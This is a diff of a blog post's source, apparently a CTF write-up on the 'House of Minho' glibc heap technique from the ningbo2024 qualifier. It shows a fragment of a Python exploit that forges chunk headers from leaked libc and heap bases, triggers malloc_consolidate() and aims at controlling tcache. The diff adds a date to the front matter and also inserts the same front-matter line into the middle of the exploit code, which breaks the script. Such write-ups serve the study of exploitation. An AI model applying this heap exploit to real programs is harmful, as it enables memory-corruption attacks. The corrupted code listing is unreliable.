@@ -1,6 +1,7 @@
 ---
 title: ningbo2024 初赛 - House of Minho
 date: 2024/5/11 13:13:00
+updated: 2024/7/25 12:34:56
 tags:
     - heap - unsorted
     - House of minho
@@ -212,6 +213,7 @@ def payload(lo:int):
            p64(0) + p64(0x21) + p64(libcBase + arena + 0x60)*2 + # shrink chunk size from 0xcf1 to 0x21
            p64(0x20) + p64(0x10) + p64(0) + p64(0x11))           # 2 lookout chunks to make forced chunk legal
     malloc0x1000() # trigger malloc_consolidate()
+updated: 2024/7/25 12:34:56
 
     # Step 4, force a small bin chain to control tcache
     heap = heapBase + 0x310
